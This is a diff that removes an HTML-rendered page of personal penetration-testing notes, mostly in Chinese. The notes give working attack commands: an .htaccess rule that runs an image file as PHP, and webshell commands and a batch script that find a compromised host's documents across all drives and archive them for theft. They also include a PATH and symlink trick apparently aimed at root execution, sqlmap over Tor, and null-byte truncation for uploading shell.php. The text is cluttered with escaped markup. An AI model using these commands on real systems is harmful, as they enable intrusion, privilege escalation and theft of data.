-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Files&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;demo&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;jpg&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  ForceType application/x-httpd-php
-  SetHandler application/x-httpd-php
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Files&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;39.&lt;/span&gt;临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
-&lt;span class=&quot;p&quot;&gt;40.&lt;/span&gt;(command1 &amp;amp; command2)==(command1;command2)    
-   command1 &amp;amp;&amp;amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp;amp; command2)或(command1;command2)中如果command1不成功,command1会执行
-   locate &lt;span class=&quot;ge&quot;&gt;*.doc &amp;gt; doc.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.docx &amp;gt; docx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.pdf &amp;gt; pdf.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.txt &amp;gt; txt.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.xls &amp;gt; xls.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.xlsx &amp;gt; xlsx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.jpg &amp;gt; jpg.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.png &amp;gt; png.list
-   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
-   
-   or when there exist the same ip but different site:
-
-   find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.\(doc\|docx\)&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;xls&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;xlsx&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;jpg&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;png&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; jpg.list    
-   ///find . -regex &quot;xxx&quot;   (.)  .  can be used or not while they both mean find the current path
-   ///sometimes the system may not support &amp;amp;&amp;amp; to execute &quot;find&quot;,then we should execute above find command without &quot;&amp;amp;&amp;amp;&quot; and find them one by one
-   ///or maybe sometimes the system may not support -regex in find command
-   ///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
-   then the better answer:
-   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
-   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
-   ///however,i found that &quot;&amp;amp;&amp;amp;&quot; or &quot;||&quot; are both not the best,coz command &quot;a &amp;amp;&amp;amp; b&quot; means only command &quot;a&quot; execute successly,then &quot;b&quot; can execute
-   ///comman &quot;a || b&quot; means if &quot;a&quot; execute successly,then &quot;b&quot; will not execute
-   ///but comman &quot;a;b&quot; means &quot;a&quot; and &quot;b&quot; will both execute,no mater the former &quot;a&quot; execute successfully or not 
-   so,the better and beeter combine command is:
-   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list;find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list;find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list;find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list;find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
-   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz
-
-   recently I found command1;command2 performs not good to search all files in webshell&#39;s upon commonds,better to execute comman1 &amp;amp;&amp;amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:
-
-   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list
-   tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz
-
-   or:
-   mkdir /tmp/tmp
-   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
-   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz
-
-   sometimes when try to execute in this way:
-   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
-
-   may found it didn&#39;t succeed to create list file except for doc.list,then try useing normal webshell&#39;s terminal to execute the one without root privilege in one of upon ways&lt;span class=&quot;sb&quot;&gt;
-
-
-&lt;/span&gt;   windows:
-   find /r 目录名 %变量名 in (匹配模式1,匹配模式2) do 命令  eg:echo &quot;yes&quot; | for /r f:&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (&lt;span class=&quot;ge&quot;&gt;*.doc,*&lt;/span&gt;.docx,&lt;span class=&quot;ge&quot;&gt;*.pdf,*&lt;/span&gt;.xls,&lt;span class=&quot;ge&quot;&gt;*.xlsx,*&lt;/span&gt;.txt) do copy &quot;%i&quot; f:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_r
-   c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ar.exe a -k -r -s -m1 c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.rar c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
-   7z.exe a -t7z -p123456 c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z c:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
-   del /f/q folder
-   rar a /v20m /m0 newfilename web.rar
-   windows find web.config==&amp;gt;for /r c:&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ttp&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;%i in (web.conf?g) do (echo &lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt;&lt;span class=&quot;ge&quot;&gt;*filepath*&lt;/span&gt;&lt;span class=&quot;gs&quot;&gt;****&lt;/span&gt; &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo %i &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; type &quot;%i&quot; &amp;gt;&amp;gt; tmp.txt &amp;gt;&amp;gt; tmp.txt &amp;amp;&amp;amp; echo. &amp;gt;&amp;gt; tmp.txt)
-   windows bat批处理for用法:http://blog.csdn.net/wh_19910525/article/details/7912440&lt;span class=&quot;sb&quot;&gt;
-
-
-&lt;/span&gt;   windows找文件命令:
-   for /f %j in (&#39;dir /b /s &quot;c:&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;SCOMCTL.O?X&quot;&#39;) do (echo %j)
-    windows找文件中的字符串命令:
-   findstr /R &quot;.&lt;span class=&quot;ge&quot;&gt;*sa.*&lt;/span&gt;&quot; c:&lt;span class=&quot;se&quot;&gt;\1\*&lt;/span&gt; &amp;gt; tmp.txt
-
-   powershell:dir –r | select-string &quot;root&quot;
-
-   windows打包(7z)命令:1.bat
-   ---------------content of 1.bat--------------------------
-    @echo off
-    goto :main
-    这是注释:(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
-    dir /s 实现了linux中的find功能,for /r path %%i in (web.conf?g) do ... 也可以实现find功能,但是自己实现时发现for /r path ...中的path只能是一个具体路径,不能是变量,这样就不能遍历全部磁盘了)
-    :main
-    set str=c d e f g h i j k l m n o p q r s t u v w x y z 
-    rd /s/q c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    md c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo  当前硬盘的分区有: 
-    for %%i in (%str%) do (
-    if exist %%i: (echo %%i:
-    
-    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.doc&quot;&#39;) do (
-    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo %%j &amp;gt;&amp;gt; tmp.txt
-    )
-    
-    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.docx&quot;&#39;) do (
-    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
-    )
-    
-    
-    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.pdf&quot;&#39;) do (
-    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
-    )
-    
-    
-    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.txt&quot;&#39;) do (
-    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
-    )
-    
-    
-    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xls&quot;&#39;) do (
-    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
-    )
-    
-    
-    for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.xlsx&quot;&#39;) do (
-    echo &quot;yes&quot; | copy &quot;%%j&quot; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp
-    echo %%j &amp;gt;&amp;gt; c:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp.txt
-    )
-    
-    
-    )
-    )
-    
-    7z a -t7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;est.7z C:&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;ecycler&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;mp&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;
-    ------------------end--------------------------------&lt;span class=&quot;sb&quot;&gt;
-
-    linux打包命令:1.sh(attention:without &quot;&amp;amp;&amp;amp; echo ok&quot;,the final tar -T xlsx.list -czf xlsx.tar.gz will fail)
-    -----------------content of 1.sh--------------------
-    mkdir /tmp/tmp &amp;amp;&amp;amp; find / -name &quot;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list &amp;amp;&amp;amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;amp;&amp;amp; echo ok
-    --------------------end-----------------------------
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;41.&lt;/span&gt;kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
-&lt;span class=&quot;p&quot;&gt;42.&lt;/span&gt;http://www.orico.com.cn/   driver    
-&lt;span class=&quot;p&quot;&gt;43.&lt;/span&gt;python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       
-&lt;span class=&quot;p&quot;&gt;45.&lt;/span&gt;os.system(&#39;&#39;&#39;python %s &amp;gt;&amp;gt; &quot;out_log.txt&quot;&#39;&#39;&#39; % exp_path) &quot;&amp;gt;&amp;gt;&quot; instead of &quot;open(file,&quot;a+&quot;) fp.write(str)&quot; in py2 or py3
-&lt;span class=&quot;p&quot;&gt;46.&lt;/span&gt;tips:  
-   msf必不可少burpsuite/fiddler必不可少python,ruby,shell,perl必不可少,不会编程还是别玩了.
-   c/c++/java能看懂写小东西,这几个得熟练nmap,sqlmap,niktoida常备dropbox,evernote常备还有啥呢?
-   成形的工具只能用于通用检测,针对具体对象,还需要写些自己的工具,另外准备些有针对性的基础库,字典啥的,经常干这个都知道先想到这些,稍后再补充,再紧张干活中…….
-&lt;span class=&quot;p&quot;&gt;47.&lt;/span&gt;google-chrome-stable on kali linux2.0
-   adding --user-data-dir
-   and open terminal : /usr/bin/google-chrome-stable %U --no-sandbox  or cd /usr/share/applications edit Google Chrome by right mouse,add     %U --no-sandbox
-&lt;span class=&quot;p&quot;&gt;48.&lt;/span&gt;sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
-   sqlmap --tor --tor-type=socks5 &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;--tor-port=9050&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; --check-tor
-   sqlmap --proxy=socks5://127.0.0.1:9050
-   sqlmap --proxy=socks5://127.0.0.1:9050 --proxy-cred=admin:pass
-&lt;span class=&quot;p&quot;&gt;49.&lt;/span&gt;tor的笔记:
-   1&amp;gt;apt-get install tor安装的tor默认端口是9050,开机自启动tor:vim /etc/rc.local,在exit 0前加上service tor start,和proxychains搭配使用时设置proxychains.conf里面的端口为9050
-   2&amp;gt;Tor-Browser洋葱浏览器自带tor,每次启动tor-browser时,它会启动它自带的tor,该tor默认端口是9150(老版本的是9050)
-   3&amp;gt;1中的tor和2中的tor功能完全一样,proxychains firefox等程序时对应的proxychains.conf里面的端口为9050,启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效.
-&lt;span class=&quot;p&quot;&gt;50.&lt;/span&gt;Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
-&lt;span class=&quot;p&quot;&gt;51.&lt;/span&gt;shadow copy神器,可以复制使用中的文件,可拷贝数据库
-&lt;span class=&quot;p&quot;&gt;52.&lt;/span&gt;php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
-&lt;span class=&quot;p&quot;&gt;53.&lt;/span&gt;php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
-&lt;span class=&quot;p&quot;&gt;54.&lt;/span&gt;php上传中%00截断的理解:
-   python脚本中:
-   def hex_to_asc(ch):
-       return &#39;{:c}&#39;.format(int(float.fromhex(ch)))
-
-   for i in range(100):
-       s = &#39;%02d&#39; % i
-       print &quot;s:%s,hex_to_asc(s):%s&quot; % (s,hex_to_asc(s))
-   可以得到如下结果:
-   s:00,hex_to_asc(s):NULL
-   s:01,hex_to_asc(s):
-   s:02,hex_to_asc(s):
-   ...
-   s:29,hex_to_asc(s):)
-   s:30,hex_to_asc(s):0
-   s:31,hex_to_asc(s):1
-   s:32,hex_to_asc(s):2
-   s:33,hex_to_asc(s):3
-   s:34,hex_to_asc(s):4
-   s:35,hex_to_asc(s):5
-   s:36,hex_to_asc(s):6
-   s:37,hex_to_asc(s):7
-   s:38,hex_to_asc(s):8
-   s:39,hex_to_asc(s):9
-   s:40,hex_to_asc(s):@
-   s:41,hex_to_asc(s):A
-   s:42,hex_to_asc(s):B
-   s:43,hex_to_asc(s):C
-   s:44,hex_to_asc(s):D
-   s:45,hex_to_asc(s):E
-   s:46,hex_to_asc(s):F
-   s:47,hex_to_asc(s):G
-   s:48,hex_to_asc(s):H
-   s:49,hex_to_asc(s):I
-   s:50,hex_to_asc(s):P
-   s:51,hex_to_asc(s):Q
-   s:52,hex_to_asc(s):R
-   s:53,hex_to_asc(s):S
-   s:54,hex_to_asc(s):T
-   s:55,hex_to_asc(s):U
-   s:56,hex_to_asc(s):V
-   s:57,hex_to_asc(s):W
-   s:58,hex_to_asc(s):X
-   s:59,hex_to_asc(s):Y
-   s:60,hex_to_asc(s):&lt;span class=&quot;err&quot;&gt;`&lt;/span&gt;
-   s:61,hex_to_asc(s):a
-   s:62,hex_to_asc(s):b
-   ascii码对照表中情况:
-   标准I表:
-   bin          dec          hex          缩写/字符                 解释
-   0000 0000    0            00           NUL(null)                空字符
-   0000 0001    1            01           SOH(start of headline)   标题开始
-   ...
-   0010 0000    32           20           (space)                  空格
-   00110000     48           30           0
-   01000001     65           41           A
-   01100001     97           61           a
-   在计算机中,所有的数据在存储和运算时都要使用二进制数表示(因为计算机用高电平和低电平分别表示1和0),例如,像a、b、c、d这样的52个字母(包括大写)、以及0、1等数字还有一些常用的符号(例如&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;、#、@等)在计算机中存储时也要使用二进制数来表示,而具体用哪些二进制数字表示哪个符号,当然每个人都可以约定自己的一套(这就叫编码),而大家如果要想互相通信而不造成混乱,那么大家就必须使用相同的编码规则,于是美国有关的标准化组织就出台了ASCII编码,统一规定了上述常用符号用哪些二进制数来表示.
-   个人理解成ascii码只是一个对照关系,如果硬说ascii是多少,则把ascii码值当作&quot;缩写/字符&quot;一栏对应的值,
-   即二进制(01000001)对应二进制(65)对应十六进制(41),而它们对应的ascii码为键盘上的可控字符&quot;A&quot;,
-   所以%00截断时的下面两种情况:
-&lt;span class=&quot;p&quot;&gt;   1.&lt;/span&gt;在url中加入%00,如http://xxoo/shell.php%00.jpg
-&lt;span class=&quot;p&quot;&gt;   2.&lt;/span&gt;在burpsuite中用burp自带的十六进制编辑工具将&quot;shell.php .jpg&quot;(中间有空格)中的空格由20改成00
-&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
-   在1中,url中的%00(形如%xx),web server会把它当作十六进制处理,然后将该十六进制数据hex(00)&quot;翻译&quot;成统一的ascii码值&quot;NUL(null)&quot;,实现了截断;
-&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
-   在2中,burpsuite用burp自带的十六进制编辑工具将&quot;shell.php .jpg&quot;(中间有空格)中的空格由20改成00,如果burp中有二进制编辑工具,
-   也可以将&quot;shell.php .jpg&quot;(中间有空格)中的空格由000010 0000(键盘上可控字符space对应的二进制)改成0000 0000(null对应的二进制),
-   上传到服务器后,服务器作为一台计算机也会将该处的原来的空格由于被改成截断符后&quot;翻译&quot;成null,实现了截断功能;
-&lt;span class=&quot;gt&quot;&gt;   &amp;gt;&lt;/span&gt;
-   所以在用python(或其它语言)中,要想&quot;写出&quot;截断符(null),
-   也就是要写出ascii码值的NUL(null),也就是要由hex(十六进制)下的
-   00变成ascii码值,这是语言和解释器以及计算机之间的关系,正如上面的python脚本,
-   而php中:
-   --------w3c:
-   定义和用法
-   chr() 函数从指定的 ASCII 值返回字符.
-   ASCII 值可被指定为十进制值、八进制值或十六进制值.八进制值被定义为带前置 0,而十六进制值被定义为带前置 0x. 
-   --------w3c  (w3c这里的说法把ascii值看作有不同的进制表示形态的各进制值)
-   其中chr(61)为=,chr(061)为1,chr(0x61)为a,chr(128)=chr(0x80),chr(255)=chr(0xff)
-   script 1:
-   &amp;lt;?php
-   for($k=0;$k&amp;lt;=255;$k++)
-   {
-   $a=&#39;shell.php&#39;.chr($k).&quot;1.jpg&quot;;
-   echo &#39;k:&#39;.$k.&#39;   &#39;.&#39;$a:&#39;.$a.&#39;   &#39;.&#39;iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a):&#39;.iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a).&quot;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;&quot;;
-   }
-   ?&amp;gt;
-
-   其中iconv(&quot;UTF-8&quot;,&quot;gbk&quot;,$a)或是iconv(&quot;UTF-8&quot;,&quot;gb2313&quot;,$a)都会在chr(128)到chr(255)之间截断,使结果为1,而不是1(some char)2,
